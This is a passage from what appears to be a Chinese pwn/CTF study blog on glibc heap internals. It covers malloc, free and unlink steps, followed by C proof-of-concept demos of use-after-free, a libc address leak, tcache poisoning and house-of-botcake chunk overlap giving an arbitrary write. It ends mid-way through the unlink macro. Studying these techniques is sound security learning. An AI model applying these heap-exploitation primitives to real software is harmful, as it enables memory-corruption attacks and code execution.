on</span><br><span class="line">       the free list.  Access to this field is serialized by</span><br><span class="line">       free_list_lock in arena.c.  *&#x2F;</span><br><span class="line">    INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">    &#x2F;* Memory allocated from the system in this arena.  *&#x2F;</span><br><span class="line">    INTERNAL_SIZE_T system_mem;</span><br><span class="line">    INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1 id="深入了解堆实现"><a href="#深入了解堆实现" class="headerlink" title="深入了解堆实现"></a>深入了解堆实现</h1><h2 id="堆初始化"><a href="#堆初始化" class="headerlink" title="堆初始化"></a>堆初始化</h2><h3 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate()"></a>malloc_consolidate()</h3><p>函数实现步骤<br>1、若 get_max_fast() 返回 0，则进行堆的初始化工作，然后进入第 7 步。<br>2、从 fastbin 中获取一个空闲 chunk。<br>3、尝试向后合并。<br>4、若向前相邻 top_chunk，则直接合并到 top_chunk，然后进入第 6 步。<br>5、否则尝试向前合并后，插入到 unsorted_bin 中。<br>6、获取下一个空闲 chunk，回到第 2 步，直到所有 fastbin 清空后进入第 7 步。<br>7、退出函数。</p>
<h2 id="创建堆"><a href="#创建堆" class="headerlink" title="创建堆"></a>创建堆</h2><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unlink 用来将一个双向链表（只存储空闲的 chunk）中的一个元素取出来，可能在以下地方使用</span><br></pre></td></tr></table></figure>
<ul>
<li>malloc<ul>
<li>从恰好大小合适的 large bin 中获取 chunk</li>
<li>从比请求的 chunk 所在的 bin 大的 bin 中取 chunk</li>
</ul>
</li>
<li>Free<ul>
<li>后向合并，合并物理相邻低地址空闲 chunk</li>
<li>前向合并，合并物理相邻高地址空闲 chunk（除了 top chunk）</li>
</ul>
</li>
<li>malloc_consolidate<ul>
<li>后向合并，合并物理相邻低地址空闲 chunk</li>
<li>前向合并，合并物理相邻高地址空闲 chunk（除了 top chunk）</li>
</ul>
</li>
<li>realloc<ul>
<li>前向扩展，合并物理相邻高地址空闲 chunk（除了top chunk）<br>在unlink后，拖链的p的fd跟bk的指针都没有变化，我们可以利用这个泄露地址。</li>
</ul>
</li>
<li>libc 地址<ul>
<li>P 位于双向链表头部，bk 泄漏</li>
<li>P 位于双向链表尾部，fd 泄漏</li>
<li>双向链表只包含一个空闲 chunk 时，P 位于双向链表中，fd 和 bk 均可以泄漏</li>
</ul>
</li>
<li>泄漏堆地址，双向链表包含多个空闲 chunk<ul>
<li>P 位于双向链表头部，fd 泄漏</li>
<li>P 位于双向链表中，fd 和 bk 均可以泄漏</li>
<li>P 位于双向链表尾部，bk 泄漏</li>
</ul>
</li>
</ul>
<h2 id="申请内存块"><a href="#申请内存块" class="headerlink" title="申请内存块"></a>申请内存块</h2><h3 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="_libc_malloc"></a>_libc_malloc</h3><p>函数实现步骤<br>1、该函数会首先检查是否有内存分配函数的钩子函数（__malloc_hook）<br>2、接着会寻找一个 arena 来试图分配内存<br>3、然后调用 _int_malloc 函数去申请对应的内存<br>4、如果分配失败的话，ptmalloc 会尝试再去寻找一个可用的 arena，并分配内存<br>5、如果申请到了 arena，那么在退出之前还得解锁。<br>6、判断目前的状态是否满足以下条件<br>+ 要么没有申请到内存<br>+ 要么是 mmap 的内存<br>+ 要么申请到的内存必须在其所分配的arena中<br>7、最后返回内存</p>
<h3 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h3><p>1、它根据用户申请的内存块大小以及相应大小 chunk 通常使用的频度（fastbin chunk, small chunk, large chunk），依次实现了不同的分配方法<br>2、它由小到大依次检查不同的 bin 中是否有相应的空闲块可以满足用户请求的内存<br>3、当所有的空闲 chunk 都无法满足时，它会考虑 top chunk<br>4、当 top chunk 也无法满足时，堆分配器才会进行内存块申请</p>
<h4 id="chunk不同范围申请实现"><a href="#chunk不同范围申请实现" class="headerlink" title="chunk不同范围申请实现"></a>chunk不同范围申请实现</h4><ul>
<li>fastbin<ul>
<li>得到对应的fastbin的下标</li>
<li>得到对应的fastbin的头指针</li>
<li>利用fd遍历对应的bin内是否有空闲的chunk块</li>
<li>检查取到的 chunk 大小是否与相应的 fastbin 索引一致</li>
<li>根据取得的 victim ，利用 chunksize 计算其大小</li>
<li>利用fastbin_index 计算 chunk 的索引</li>
<li>将获取的到chunk转换为mem模式</li>
<li>如果设置了perturb_type, 则将获取到的chunk初始化为 perturb_type ^ 0xff</li>
</ul>
</li>
<li>small bin<ul>
<li>获取 small bin 的索引</li>
<li>获取对应 small bin 中的 chunk 指针</li>
<li>先执行 victim = last(bin)，获取 small bin 的最后一个 chunk</li>
<li>如果 victim = bin ，那说明该 bin 为空</li>
<li>如果不相等，那么会有两种情况<ul>
<li>第一种情况，small bin 还没有初始化<ul>
<li>执行初始化，将 fast bins 中的 chunk 进行合并</li>
</ul>
</li>
<li>第二种情况，small bin 中存在空闲的 chunk<ul>
<li>获取 small bin 中倒数第二个 chunk</li>
<li>检查 bck-&gt;fd 是不是 victim，防止伪造</li>
<li>设置 victim 对应的 inuse 位</li>
<li>修改 small bin 链表，将 small bin 的最后一个 chunk 取出</li>
<li>如果不是 main_arena，设置对应的标志</li>
<li>将申请到的 chunk 转化为对应的 mem 状态</li>
<li>如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>large bin<ul>
<li>获取large bin的下标</li>
<li>如果存在fastbin的话，会处理 fastbin</li>
</ul>
</li>
<li>大循环<br>如果程序执行到了这里，那么说明 与 chunk 大小正好一致的 bin (fast bin， small bin) 中没有 chunk可以直接满足需求 ，但是large chunk 则是在这个大循环中处理<ul>
<li>尝试从 unsorted bin 中分配用户所需的内存<ul>
<li>unsort bin 遍历</li>
<li>small request</li>
<li>初始取出</li>
<li>exact fit</li>
<li>place chunk in small bin</li>
<li>place chunk in large bin</li>
<li>最终取出</li>
<li>while 最多迭代10000次</li>
<li></li>
</ul>
</li>
<li>尝试从 large bin 中分配用户所需的内存</li>
<li>寻找较大 chunk<ul>
<li>找到一个合适的 map</li>
<li>找到合适的 bin</li>
<li>简单检查 chunk</li>
<li>真正取出chunk</li>
</ul>
</li>
<li>尝试从 top chunk 中分配用户所需内存</li>
</ul>
</li>
</ul>
<h2 id="释放内存块"><a href="#释放内存块" class="headerlink" title="释放内存块"></a>释放内存块</h2><h3 id="libc-free"><a href="#libc-free" class="headerlink" title="_libc_free"></a>_libc_free</h3><ul>
<li>判断是否有钩子函数 __free_hook</li>
<li>free NULL没有作用</li>
<li>将mem转换为chunk状态</li>
<li>如果该块内存是mmap得到的</li>
<li>根据chunk获得分配区的指针</li>
<li>执行释放</li>
</ul>
<h1 id="内容来源"><a href="#内容来源" class="headerlink" title="内容来源"></a>内容来源</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/diegodu/p/9230280.html">Linux进程分配内存的两种方式brk和mmap</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/linuxnewbie/p/3884611.html">sbrk与brk的使用</a><br><a target="_blank" rel="noopener" href="https://wiki.x10sec.org/pwn/heap/heap_overview/">ctfwiki概述</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41453285/article/details/96847761">堆漏洞挖掘:02—堆的glibc实现与Arena</a><br><a target="_blank" rel="noopener" href="https://wiki.x10sec.org/pwn/heap/heap_structure/">ctfwiki堆相关数据结构</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/plus_re/article/details/79265805">浅谈 malloc_consolidate() 函数具体实现</a><br><a target="_blank" rel="noopener" href="https://wiki.x10sec.org/pwn/heap/heap_implementation_details/#chunk">ctfwiki深入理解堆实现</a></p>
<p>本文作者：PwnKi</p>
<p>本文链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html">https://www.cnblogs.com/luoleqi/p/11801400.html</a></p>
<hr>
<h2 id="uaf漏洞利用"><a href="#uaf漏洞利用" class="headerlink" title="uaf漏洞利用"></a>uaf漏洞利用</h2><p><img src="https://i.imgur.com/H1n8uM1.png"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> size 32</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">char</span> *buf1;</span><br><span class="line">    <span class="keyword">char</span> *buf2;</span><br><span class="line"> </span><br><span class="line">    buf1 = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buf1：0x%p\n&quot;</span>, buf1);</span><br><span class="line">    <span class="built_in">free</span>(buf1);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 分配 buf2 去“占坑”buf1 的内存位置</span></span><br><span class="line">    buf2 = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buf2：0x%p\n\n&quot;</span>, buf2);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 对buf2进行内存清零</span></span><br><span class="line">    <span class="built_in">memset</span>(buf2, <span class="number">0</span>, size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buf2：%d\n&quot;</span>, *buf2);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 重引用已释放的buf1指针，但却导致buf2值被篡改</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;==== Use After Free ===\n&quot;</span>);</span><br><span class="line">    <span class="built_in">strncpy</span>(buf1, <span class="string">&quot;hack&quot;</span>, <span class="number">5</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buf2：%s\n\n&quot;</span>, buf2);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">free</span>(buf2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<blockquote>
<p>在通常的浏览器UAF漏洞中，都是某个C++对象被释放后重引用，假设程序存在UAF的漏洞，有个悬挂指针指向test对象，要实现漏洞利用，通过占坑方式覆盖test对象的虚表指针，虚表指针指向虚函数存放地址，现在让其指向恶意构造的shellcode，当程序再次引用到test对象就会导致任意代码执行。</p>
</blockquote>
<p>虚函数：用virtual关键字申明的函数叫做虚函数，其一定是类的成员函数</p>
<p>虚表：存在虚函数的类都有一个一维的虚函数表叫做虚表</p>
<p>虚表指针：类的对象有一个指向虚表开始的虚指针。</p>
<blockquote>
<p>虚表和类对应</p>
<p>虚指针和对象对应</p>
</blockquote>
<p>当对象去调用这个虚函数的时候就会使用到这个虚指针，去虚表中查找对应虚函数的地址。</p>
<h1 id="tcache-bin"><a href="#tcache-bin" class="headerlink" title="tcache bin"></a>tcache bin</h1><p>bin有/tcache bin /fast bin /unsorted bin /small bin /largebin</p>
<p>tcahebin相对于其他的出现得比较晚，在2.26加入。</p>
<p>它的全名为：thread local caching</p>
<blockquote>
<p>它为每个线程创建一个缓存，里面包含了一些小堆块。每个线程默认使用64个单链表结构的bins，每个bins最多存放7个chunk。</p>
<p>它和fastbin类似，先进后出，而且prev_inuse标记位不会被清除，所以tcachebin中的chunk不会被合并，即使和top chunk相邻，但是有很多fastbin的保护机制它没有应用。</p>
<p>|————————————-|</p>
<p>|————————————-|</p>
<p>链接七个chunk</p>
<p>|        |     |    |   |……64个bin</p>
<p>|—-|—-|—-|—|—|—|—|—|—|</p>
</blockquote>
<blockquote>
<p>大小：0x20~0x410.</p>
</blockquote>
<p>另外tcache机制出现后，每次产生对都会先产生一个0x250/0x290(glibc 2.31)大小的堆块，该堆块位于堆的开头，用于记录每个bins中的chunk数量，每个字节对应一条tcache bin链的数量。</p>
<blockquote>
<p>strings /lib/x86_64-linux-gnu/libc.so.6|grep ‘GLIBC’本机的是2.31版本的glibc</p>
</blockquote>
<p>还有一点值得注意tcachebin中的fd指针式指向malloc返回地址，也就是用户数据部分，与fastbin不同，fastbinfd指针指向chunk头（bin—空闲chunk）</p>
<p>绕过tcache，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *ptr[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *a = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">	<span class="comment">// 申请7个，释放7个，填满tcache bin[0x90]</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)</span><br><span class="line">        ptr[i] = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)</span><br><span class="line">        <span class="built_in">free</span>(ptr[i]);</span><br><span class="line">    <span class="comment">// 这里再释放a，就会放入到unsorted bin中</span></span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libc addr is %llx\n&quot;</span>, (<span class="keyword">long</span> <span class="keyword">long</span>)a[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>上面代码只是填满了[0x90]这一条tcache bin链表，如果想要自己申请释放的0x20大小的chunk进入到fast bin，那么同样需要先填满tcache bin[0x20]。</p>
<p>tcache poisoning</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 在fck处分配堆块</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> fck;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fck addr is %p\n&quot;</span>, &amp;fck);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> * ptr = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *ptr1=<span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc ptr addr is %p\n&quot;</span>, ptr);</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    <span class="comment">// 只需修改fd指针，申请的大小和当前tcache bin大小相同即可</span></span><br><span class="line">    ptr1[<span class="number">0</span>] = (<span class="keyword">long</span> <span class="keyword">long</span>)&amp;fck;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the second malloc addr is %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x80</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p>在将chunk放入tcache之后，会将chunk-&gt;key设置为tcachestruct，即是heap的开头，来表示该chunk已经放入了tcache。而将chunk从tcache取出来后则将chunk-&gt;key设置为NULL清空。 总体上对tcache的改动是在tcacheentry结构指针中增加了一个变量key，<strong>来表明该chunk是否处于tcache的状态。</strong></p>
</blockquote>
<h3 id="tcache-botcake-块重叠"><a href="#tcache-botcake-块重叠" class="headerlink" title="tcache_botcake 块重叠"></a>tcache_botcake 块重叠</h3><p><img src="C:\Users\86152\AppData\Roaming\Typora\typora-user-images\image-20210917191410991.png" alt="image-20210917191410991"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> victim = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Inspired by how2heap\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can use this technique to create chunk overlap, only relies on double free.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n1. Alloc 7 chunks to fill up tcache list\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n2. Prepare two chunk with the same size as befor, for consolidation in unsortedbin\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);<span class="comment">//0x100大于fastbin大小，于是进入unsortedbin，否则在tcache用完后该使用fastbin了,这里的大小必须也是0x100，因为只有这个之前malloc过7次的tcachebin链表满了</span></span><br><span class="line">    <span class="keyword">char</span> *b = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Padding chunk to prevent consolidation\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//这个为了避免top chunk合并物理相邻的chunk</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n3. Fill in the tcache list and consolidation two prepared chunk in unsortedbin\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n4. Get a chunk from tcache list and make chunk overlap\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(b);<span class="comment">//double free 中间间隔a</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now, chunk %p will be freed into tcache list\n&quot;</span>, b);    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span>* res = <span class="built_in">malloc</span>(<span class="number">0x130</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Size is not matched with tcache list, so get chunk from unsortedbin, which makes chunk overlap\n&quot;</span>);</span><br><span class="line">   </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    *(<span class="keyword">uint64_t</span>*)(res+<span class="number">0x110</span>) = (<span class="keyword">uint64_t</span>)(&amp;victim);<span class="comment">//uint64_t:long int     unsortedbin合并成一个大chunk，于是对malloc到的较大chunk能更改其fd值，于是tcachebin中根据9b20的fd把0x0000555555558030链接上tcache，但是8030没有bk于是无法找到下面的chunk，再次malloc以后就把8030这个地址给了用户，用户就能在这个地址内随意写。</span></span><br><span class="line"><span class="comment">//我在这个大块里面填写和直接使用b那个地址指针填写有什么区别？</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now, you can control tcache list to alloc arbitrary address\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span> *target = <span class="built_in">malloc</span>(<span class="number">0x100</span>);<span class="comment">//这里拿到victim这个地址的随意写</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Before attack, victim&#x27;s value: 0x%lx\n&quot;</span>, victim);</span><br><span class="line">    *(<span class="keyword">uint64_t</span>*)target = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After attack, victim&#x27;s value: 0x%lx\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>整个利用流程：</p>
<p>首先malloc比fastbin大的chunk，malloc了7个，再malloc了a 、b大小和前面相同。</p>
<p>（unsorted bin会合并空闲相邻的chunk）</p>
<p>接下来free7个chunk，把tcachebin填满，接下来free b,a 因为没有置0，所以他们都可以继续使用。</p>
<p>再接下来malloc(0x100)把tcache空出来，把b放进tcache里面（再次free b）,这样b既在tcachebin中也在unsorted里面，虽然被合并了。</p>
<p>接下来malloc(0x130)，tcache中的内容不符合标准（大小），于是切割unsortedbin中的chunk，这个大小已经把b的范围圈进去了，下面res+0x110直接写入fd，改为victim的地址（任意写），于是tcachebin中b的fd变成了victim的地址，头部直接指向victim地址处，再次malloc(0x100)就会把victim地址给用户，向这个地址内写入内容。</p>
<blockquote>
<p>和上面那个有什么区别？</p>
<p>在这里没有直接使用那个被更改chunk的指针，而是通过前一个指针来索引。</p>
<p>参考链接：<a target="_blank" rel="noopener" href="http://www.wangqingzheng.com/anquanke/60/194960.html">http://www.wangqingzheng.com/anquanke/60/194960.html</a></p>
</blockquote>
<h3 id="tcache-house-of-einherjar"><a href="#tcache-house-of-einherjar" class="headerlink" title="tcache_house_of_einherjar"></a>tcache_house_of_einherjar</h3><blockquote>
<p>The House of Einherjar 使用空字节逐一溢出来控制 malloc() 返回的指针。</p>
<p>off by one 修改下一个堆块的 prev_size、修改下一个堆块的 PREV_INUSE 比特位。</p>
</blockquote>
<p><strong>intptr_t是为了跨平台，其长度总是所在平台的位数，所以用来存放地址。</strong></p>
<p>unlink的诀窍就是通过验证，我们需要</p>
<ul>
<li><code>fake_chunk-&gt;fd == (struct malloc_chunk *)P</code></li>
<li><code>fake_chunk-&gt;bk == (struct malloc_chunk *)P</code></li>
</ul>
<p>unlink:</p>
<blockquote>
<p>unlink是利用glibc malloc 的内存回收机制造成攻击的，核心就在于当<strong>两个free的堆块在物理上相邻时</strong>，会将他们合并，并将原来free的堆块在<strong>原来</strong>的链表中<strong>解链</strong>，<strong>加入新的链表</strong>中</p>
</blockquote>
<p><strong>检查：</strong></p>
<p><strong>1.size检查，当前chunk的size和下一个chunk的pre_size大小是否一样</strong></p>
<p><strong>2.fd和bk检查，FD-&gt;bk = P &amp;&amp;BK-&gt;fd = P</strong> 这个大写FD BK是本chunk的前一个和后一个chunk</p>
<p><em>3.largebin中nextsize双向链表完整性检查（少用）</em></p>
<p>glibc 2.23<br>​    检查p和其前后的chunk是否构成双向链表<br>​    检查p和其前后的large chunk的nextsize域是否构成双向链表<br>glibc 2.27 2.29 新增加一下保护<br>​    检查p的 size 是否等于物理相邻的后一个chunk的 pre_size</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line">\</span><br><span class="line">\<span class="comment">/* 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查) */</span>\</span><br><span class="line">    \<span class="comment">/* 1. prev_size 检查 */</span>\</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);            \</span><br><span class="line">    FD = P-&gt;fd;                      \</span><br><span class="line">    BK = P-&gt;bk;                      \</span><br><span class="line">    \</span><br><span class="line">    \<span class="comment">/* 检查 fd 和 bk 指针(双向链表完整性检查) */</span>\</span><br><span class="line">    \<span class="comment">/* 2. 双向链表完整性检查 */</span>\</span><br><span class="line">    <span class="keyword">if</span> 